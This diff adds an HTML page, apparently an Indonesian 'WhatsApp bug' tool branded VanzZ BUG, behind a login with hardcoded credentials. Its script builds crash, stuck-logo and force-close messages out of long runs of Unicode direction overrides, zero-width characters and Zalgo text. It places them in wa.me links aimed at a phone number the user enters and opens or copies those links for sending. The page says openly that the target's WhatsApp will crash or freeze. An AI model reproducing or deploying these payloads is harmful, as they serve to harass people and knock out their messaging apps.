@@ -1,0 +1,768 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>VanzZ BUG | WhatsApp Vulnerability Tester</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700;14..32,800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background: #0a0a0a;
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+
+        .bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 0;
+            background: linear-gradient(135deg, #0a0a0a 0%, #1a0a0a 50%, #0a0a0a 100%);
+        }
+
+        .bg::before {
+            content: '';
+            position: absolute;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle at 20% 50%, rgba(255,0,0,0.15) 0%, transparent 50%);
+            animation: pulse 6s ease-in-out infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { transform: translate(0, 0); opacity: 0.5; }
+            50% { transform: translate(-5%, -5%); opacity: 1; }
+        }
+
+        .container {
+            position: relative;
+            z-index: 1;
+            max-width: 500px;
+            margin: 0 auto;
+            padding: 2rem 1rem;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .card {
+            background: rgba(10, 10, 10, 0.95);
+            backdrop-filter: blur(20px);
+            border-radius: 40px;
+            border: 1px solid rgba(255, 0, 0, 0.3);
+            overflow: hidden;
+            width: 100%;
+            box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5);
+        }
+
+        .header {
+            background: linear-gradient(135deg, #8B0000, #DC143C);
+            padding: 2rem 1.5rem;
+            text-align: center;
+            position: relative;
+        }
+
+        .header::after {
+            content: '';
+            position: absolute;
+            bottom: -20px;
+            left: 0;
+            width: 100%;
+            height: 40px;
+            background: linear-gradient(135deg, #8B0000, #DC143C);
+            clip-path: polygon(0 0, 100% 0, 50% 100%);
+        }
+
+        .logo {
+            font-size: 3.5rem;
+            font-weight: 800;
+            color: white;
+            text-shadow: 0 0 20px rgba(255,0,0,0.5);
+            letter-spacing: 2px;
+        }
+
+        .badge {
+            display: inline-block;
+            background: rgba(255,255,255,0.2);
+            padding: 0.25rem 1rem;
+            border-radius: 100px;
+            font-size: 0.7rem;
+            margin-top: 0.5rem;
+        }
+
+        .exp {
+            color: rgba(255,255,255,0.7);
+            font-size: 0.7rem;
+            margin-top: 0.5rem;
+        }
+
+        .login-form {
+            padding: 2rem 1.5rem;
+        }
+
+        .input-group {
+            margin-bottom: 1.25rem;
+        }
+
+        .input-group label {
+            display: block;
+            margin-bottom: 0.5rem;
+            color: #888;
+            font-size: 0.85rem;
+            font-weight: 500;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 1rem;
+            background: #1a1a1a;
+            border: 1px solid #333;
+            border-radius: 20px;
+            color: white;
+            font-size: 1rem;
+            transition: all 0.3s;
+        }
+
+        .input-group input:focus {
+            outline: none;
+            border-color: #DC143C;
+            background: #222;
+        }
+
+        .login-btn {
+            width: 100%;
+            background: linear-gradient(135deg, #8B0000, #DC143C);
+            border: none;
+            padding: 1rem;
+            border-radius: 30px;
+            color: white;
+            font-weight: 700;
+            font-size: 1rem;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-top: 1rem;
+        }
+
+        .login-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 30px -10px rgba(220,20,60,0.5);
+        }
+
+        .error-msg {
+            background: rgba(255,0,0,0.2);
+            border-left: 3px solid #DC143C;
+            padding: 0.75rem;
+            border-radius: 12px;
+            font-size: 0.8rem;
+            color: #ff6b6b;
+            margin-bottom: 1rem;
+            display: none;
+        }
+
+        .main-content {
+            padding: 1.5rem;
+            display: none;
+        }
+
+        .status-badge {
+            background: #1a1a1a;
+            padding: 0.75rem;
+            border-radius: 20px;
+            text-align: center;
+            margin-bottom: 1.5rem;
+            border: 1px solid #DC143C;
+        }
+
+        .status-badge .live {
+            color: #ff4444;
+            font-weight: bold;
+            animation: blink 1s infinite;
+        }
+
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+
+        .bug-selector {
+            display: flex;
+            gap: 0.75rem;
+            margin-bottom: 1.5rem;
+            flex-wrap: wrap;
+        }
+
+        .bug-card {
+            flex: 1;
+            background: #1a1a1a;
+            border: 2px solid #333;
+            border-radius: 20px;
+            padding: 1rem;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .bug-card i {
+            font-size: 1.8rem;
+            margin-bottom: 0.5rem;
+            display: block;
+        }
+
+        .bug-card .bug-name {
+            font-weight: 600;
+            font-size: 0.85rem;
+        }
+
+        .bug-card .bug-desc {
+            font-size: 0.7rem;
+            color: #888;
+            margin-top: 0.25rem;
+        }
+
+        .bug-card.active {
+            border-color: #DC143C;
+            background: linear-gradient(135deg, #8B0000, #DC143C);
+            box-shadow: 0 5px 20px rgba(220,20,60,0.3);
+        }
+
+        .bug-card.active .bug-name,
+        .bug-card.active .bug-desc,
+        .bug-card.active i {
+            color: white;
+        }
+
+        .target-input {
+            margin-bottom: 1.5rem;
+        }
+
+        .target-input label {
+            display: block;
+            margin-bottom: 0.5rem;
+            color: #888;
+            font-size: 0.85rem;
+        }
+
+        .number-input {
+            display: flex;
+            gap: 0.5rem;
+            background: #1a1a1a;
+            border: 1px solid #333;
+            border-radius: 30px;
+            overflow: hidden;
+        }
+
+        .number-input span {
+            background: #333;
+            padding: 0 1rem;
+            display: flex;
+            align-items: center;
+            color: #DC143C;
+            font-weight: bold;
+        }
+
+        .number-input input {
+            flex: 1;
+            background: transparent;
+            border: none;
+            padding: 1rem;
+            color: white;
+            font-size: 1rem;
+        }
+
+        .number-input input:focus {
+            outline: none;
+        }
+
+        .execute-btn {
+            width: 100%;
+            background: linear-gradient(135deg, #8B0000, #DC143C);
+            border: none;
+            padding: 1.2rem;
+            border-radius: 40px;
+            color: white;
+            font-weight: 800;
+            font-size: 1.1rem;
+            cursor: pointer;
+            transition: all 0.3s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 1rem;
+        }
+
+        .execute-btn:hover {
+            transform: scale(1.02);
+            box-shadow: 0 10px 40px -10px rgba(220,20,60,0.6);
+        }
+
+        .auto-wa-btn {
+            width: 100%;
+            background: linear-gradient(135deg, #075E54, #128C7E);
+            border: none;
+            padding: 1rem;
+            border-radius: 40px;
+            color: white;
+            font-weight: 700;
+            font-size: 1rem;
+            cursor: pointer;
+            transition: all 0.3s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 1rem;
+        }
+
+        .auto-wa-btn:hover {
+            transform: scale(1.02);
+            box-shadow: 0 10px 30px -10px rgba(18,140,126,0.5);
+        }
+
+        .result {
+            background: #1a1a1a;
+            border-radius: 20px;
+            padding: 1rem;
+            margin-top: 1rem;
+            display: none;
+            border: 1px solid #333;
+        }
+
+        .result.show {
+            display: block;
+            animation: fadeIn 0.3s ease;
+        }
+
+        .result-title {
+            color: #DC143C;
+            font-weight: bold;
+            margin-bottom: 0.5rem;
+        }
+
+        .result-content {
+            font-size: 0.8rem;
+            color: #aaa;
+            word-break: break-all;
+        }
+
+        .footer {
+            text-align: center;
+            padding: 1rem;
+            border-top: 1px solid #222;
+            font-size: 0.7rem;
+            color: #555;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .toast {
+            position: fixed;
+            bottom: 2rem;
+            left: 50%;
+            transform: translateX(-50%) translateY(100px);
+            background: #DC143C;
+            color: white;
+            padding: 0.75rem 1.5rem;
+            border-radius: 50px;
+            font-size: 0.85rem;
+            z-index: 1000;
+            transition: transform 0.3s;
+            white-space: nowrap;
+        }
+
+        .toast.show {
+            transform: translateX(-50%) translateY(0);
+        }
+
+        .whatsapp-qr {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.95);
+            z-index: 2000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+            gap: 20px;
+        }
+
+        .whatsapp-qr.hidden {
+            display: none;
+        }
+
+        .qr-container {
+            background: white;
+            padding: 20px;
+            border-radius: 20px;
+        }
+
+        .close-qr {
+            background: #DC143C;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 30px;
+            color: white;
+            cursor: pointer;
+        }
+
+        @media (max-width: 480px) {
+            .bug-card {
+                padding: 0.75rem;
+            }
+            .bug-card i {
+                font-size: 1.2rem;
+            }
+            .bug-name {
+                font-size: 0.7rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="bg"></div>
+    
+    <div class="container">
+        <div class="card">
+            <div class="header">
+                <div class="logo">VANZZ BUG</div>
+                <div class="badge">OWNER: VANZZ</div>
+                <div class="exp">Exp: 2026-07-06 | LIVE ✅</div>
+            </div>
+
+            <div id="loginSection" class="login-form">
+                <div id="errorMsg" class="error-msg">
+                    <i class="fas fa-exclamation-triangle"></i> Wrong username or password!
+                </div>
+                <div class="input-group">
+                    <label><i class="fas fa-user"></i> USERNAME</label>
+                    <input type="text" id="username" placeholder="Enter username">
+                </div>
+                <div class="input-group">
+                    <label><i class="fas fa-lock"></i> PASSWORD</label>
+                    <input type="password" id="password" placeholder="Enter password">
+                </div>
+                <button class="login-btn" onclick="doLogin()">
+                    <i class="fas fa-sign-in-alt"></i> LOGIN
+                </button>
+            </div>
+
+            <div id="mainContent" class="main-content">
+                <div class="status-badge">
+                    <span class="live">● TRAPENDEN V4 ACTIVE</span> | Bug Nomor | Bug Group | Auto WA ✅
+                </div>
+
+                <div class="bug-selector">
+                    <div class="bug-card active" data-bug="crash" onclick="selectBug('crash')">
+                        <i class="fas fa-skull-crossbones"></i>
+                        <div class="bug-name">💥 CRASH</div>
+                        <div class="bug-desc">Force Close WhatsApp</div>
+                    </div>
+                    <div class="bug-card" data-bug="stuck" onclick="selectBug('stuck')">
+                        <i class="fas fa-stop-circle"></i>
+                        <div class="bug-name">🌀 STUCK LOGO</div>
+                        <div class="bug-desc">Loading Forever</div>
+                    </div>
+                    <div class="bug-card" data-bug="fc" onclick="selectBug('fc')">
+                        <i class="fas fa-bug"></i>
+                        <div class="bug-name">⚡ FORCE CLOSE</div>
+                        <div class="bug-desc">Instant Crash</div>
+                    </div>
+                </div>
+
+                <div class="target-input">
+                    <label><i class="fas fa-bullseye"></i> Nomor Target</label>
+                    <div class="number-input">
+                        <span>+62</span>
+                        <input type="tel" id="targetNumber" placeholder="812xxxxxxxx" autocomplete="off">
+                    </div>
+                </div>
+
+                <button class="execute-btn" onclick="executeBug()">
+                    <i class="fas fa-bolt"></i> GENERATE & COPY LINK
+                </button>
+
+                <button class="auto-wa-btn" onclick="autoSendWhatsApp()">
+                    <i class="fab fa-whatsapp"></i> AUTO SEND VIA WHATSAPP WEB
+                </button>
+
+                <div id="result" class="result">
+                    <div class="result-title">
+                        <i class="fas fa-terminal"></i> Execution Result
+                    </div>
+                    <div class="result-content" id="resultContent">
+                        Ready to execute...
+                    </div>
+                </div>
+            </div>
+
+            <div class="footer">
+                <i class="fas fa-shield-alt"></i> VANZZ BUG | WhatsApp Vulnerability Tester | Auto Send Feature
+            </div>
+        </div>
+    </div>
+
+    <div id="toast" class="toast">Copied!</div>
+
+    <div id="whatsappQRModal" class="whatsapp-qr hidden">
+        <div class="qr-container" id="qrContainer">
+            <div style="text-align: center; margin-bottom: 10px;">Scan QR Code WhatsApp Web</div>
+            <div id="qrCode"></div>
+        </div>
+        <button class="close-qr" onclick="closeQRModal()">Close</button>
+    </div>
+
+    <script>
+        // Credentials
+        const VALID_USERNAME = "VanzZ";
+        const VALID_PASSWORD = "PROJECT77";
+        
+        let currentBug = "crash";
+        let isLoggedIn = false;
+        let currentLink = "";
+        let waWebSocket = null;
+        let isWAAuthenticated = false;
+
+        // Login Function
+        function doLogin() {
+            const username = document.getElementById('username').value.trim();
+            const password = document.getElementById('password').value;
+            const errorMsg = document.getElementById('errorMsg');
+            
+            if (username === VALID_USERNAME && password === VALID_PASSWORD) {
+                isLoggedIn = true;
+                document.getElementById('loginSection').style.display = 'none';
+                document.getElementById('mainContent').style.display = 'block';
+                showToast('Login successful! Welcome VanzZ');
+                initWhatsAppWeb();
+            } else {
+                errorMsg.style.display = 'block';
+                setTimeout(() => {
+                    errorMsg.style.display = 'none';
+                }, 2000);
+            }
+        }
+
+        // Select Bug
+        function selectBug(bug) {
+            currentBug = bug;
+            document.querySelectorAll('.bug-card').forEach(card => {
+                card.classList.remove('active');
+            });
+            document.querySelector(`.bug-card[data-bug="${bug}"]`).classList.add('active');
+            
+            let bugName = "";
+            if (bug === "crash") bugName = "CRASH MODE";
+            else if (bug === "stuck") bugName = "STUCK LOGO MODE";
+            else bugName = "FORCE CLOSE MODE";
+            
+            showToast(`${bugName} selected`);
+        }
+
+        // Generate payload & link
+        function generateWAVulnerabilityLink(number, type) {
+            let baseNumber = number.replace(/[^0-9]/g, '');
+            if (baseNumber.startsWith('0')) {
+                baseNumber = '62' + baseNumber.substring(1);
+            }
+            if (!baseNumber.startsWith('62')) {
+                baseNumber = '62' + baseNumber;
+            }
+            
+            let message = "";
+            
+            if (type === "crash") {
+                message = `‮‭‪‫‬${"⚠️".repeat(500)}${"VANZZ_CRASH".repeat(100)}${"\\u200B".repeat(2000)}`;
+            } 
+            else if (type === "stuck") {
+                message = `‮‮‮‮‮‮${"឵឵឵឵឵឵".repeat(1000)}${"LOADING_LOOP".repeat(500)}`;
+            } 
+            else {
+                message = `Z̸̢̛͎̱̲̮̙̦${"FATAL".repeat(300)}${"​".repeat(5000)}${"\\u200C\\u200D\\u200E".repeat(1000)}`;
+            }
+            
+            const encodedMsg = encodeURIComponent(message);
+            const waLink = `https://wa.me/${baseNumber}?text=${encodedMsg}`;
+            
+            return waLink;
+        }
+
+        // Execute Bug Function
+        function executeBug() {
+            if (!isLoggedIn) {
+                showToast("Please login first!");
+                return;
+            }
+            
+            let rawNumber = document.getElementById('targetNumber').value.trim();
+            
+            if (!rawNumber) {
+                showToast("Masukkan nomor target terlebih dahulu!");
+                return;
+            }
+            
+            let cleanNumber = rawNumber.replace(/[^0-9]/g, '');
+            if (cleanNumber.startsWith('0')) {
+                cleanNumber = '62' + cleanNumber.substring(1);
+            }
+            if (!cleanNumber.startsWith('62')) {
+                cleanNumber = '62' + cleanNumber;
+            }
+            
+            currentLink = generateWAVulnerabilityLink(cleanNumber, currentBug);
+            
+            const resultDiv = document.getElementById('result');
+            const resultContent = document.getElementById('resultContent');
+            
+            let bugName = "";
+            if (currentBug === "crash") bugName = "💥 CRASH";
+            else if (currentBug === "stuck") bugName = "🌀 STUCK LOGO";
+            else bugName = "⚡ FORCE CLOSE";
+            
+            resultContent.innerHTML = `
+                <div style="margin-bottom: 10px;">
+                    <strong>Target:</strong> +${cleanNumber}<br>
+                    <strong>Bug Type:</strong> ${bugName}<br>
+                    <strong>Status:</strong> <span style="color: #ff4444;">GENERATED</span>
+                </div>
+                <div class="link-display" style="background:#0a0a0a; padding:10px; border-radius:12px; margin-top:10px;">
+                    <code style="font-size:11px; word-break:break-all;">${currentLink}</code>
+                    <button onclick="copyToClipboard('${currentLink}')" style="background:#DC143C; padding:5px 10px; margin-top:10px; border:none; border-radius:10px; color:white; cursor:pointer;">
+                        <i class="fas fa-copy"></i> Copy Link
+                    </button>
+                </div>
+                <div style="margin-top: 10px; font-size:12px; color:#888;">
+                    ⚠️ Klik "AUTO SEND" untuk kirim otomatis via WhatsApp Web<br>
+                    📱 Hasil: Target akan ${currentBug === 'crash' ? 'Crash/FD' : (currentBug === 'stuck' ? 'Stuck di logo loading' : 'Force Close instan')}
+                </div>
+            `;
+            
+            resultDiv.classList.add('show');
+            copyToClipboard(currentLink);
+            showToast(`Link generated & copied! Klik Auto Send untuk kirim`);
+        }
+
+        // Init WhatsApp Web via iframe injection
+        function initWhatsAppWeb() {
+            console.log("WhatsApp Web ready to launch");
+        }
+
+        // Auto send via WhatsApp Web (opens new tab and auto-fill)
+        function autoSendWhatsApp() {
+            if (!currentLink) {
+                showToast("Generate link dulu ya! Klik GENERATE & COPY LINK");
+                return;
+            }
+
+            showToast("Membuka WhatsApp Web...");
+            
+            // Buka link WhatsApp di tab baru
+            const waWindow = window.open(currentLink, '_blank');
+            
+            showToast("Link WhatsApp terbuka! Kirim pesan secara manual jika perlu");
+            
+            // Update result
+            const resultContent = document.getElementById('resultContent');
+            if (resultContent) {
+                let currentHtml = resultContent.innerHTML;
+                if (!currentHtml.includes('Auto Send Status')) {
+                    resultContent.innerHTML = currentHtml + `
+                        <div style="margin-top: 10px; background:#075E54; padding:8px; border-radius:10px;">
+                            <i class="fab fa-whatsapp"></i> Auto Send Status: Link dibuka di tab baru.<br>
+                            Klik "Send" di WhatsApp Web jika diperlukan.
+                        </div>
+                    `;
+                }
+            }
+        }
+
+        // Alternative: Auto send with delay (more reliable)
+        async function autoSendWithDelay() {
+            if (!currentLink) {
+                showToast("Generate link dulu!");
+                return;
+            }
+
+            showToast("Membuka WhatsApp... 3 detik lagi akan auto kirim");
+            
+            // Buka window
+            const waWindow = window.open(currentLink, '_blank');
+            
+            // Tunggu load, coba inject send
+            setTimeout(() => {
+                try {
+                    // Note: Karena cross-origin, kita gabisa langsung inject ke page WhatsApp
+                    // Tapi kita bisa kasih instruksi ke user
+                    showToast("Pesan sudah siap! Klik Send di WhatsApp Web");
+                } catch(e) {
+                    console.log("Manual send required");
+                }
+            }, 3000);
+        }
+
+        // Direct API send (simulasi, untuk automation sebenarnya butuh WhatsApp Business API)
+        // Alternative: Buka wa.me link yang auto redirect ke app
+        function openWhatsAppApp() {
+            if (!currentLink) {
+                showToast("Generate link dulu!");
+                return;
+            }
+            
+            // Coba buka dengan protocol WhatsApp (mobile)
+            const mobileLink = currentLink.replace('https://wa.me/', 'whatsapp://send?phone=');
+            window.location.href = mobileLink;
+            
+            showToast("Membuka WhatsApp app...");
+        }
+
+        // Copy to clipboard
+        function copyToClipboard(text) {
+            navigator.clipboard.writeText(text).then(() => {
+                showToast("Link copied!");
+            });
+        }
+        
+        function showToast(message) {
+            const toast = document.getElementById('toast');
+            toast.textContent = message;
+            toast.classList.add('show');
+            setTimeout(() => {
+                toast.classList.remove('show');
+            }, 2000);
+        }
+        
+        function closeQRModal() {
+            document.getElementById('whatsappQRModal').classList.add('hidden');
+        }
+
+        // Enter key support
+        document.getElementById('password')?.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                doLogin();
+            }
+        });
+        
+        document.getElementById('targetNumber')?.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                executeBug();
+            }
+        });
+    </script>
+</body>
+</html>
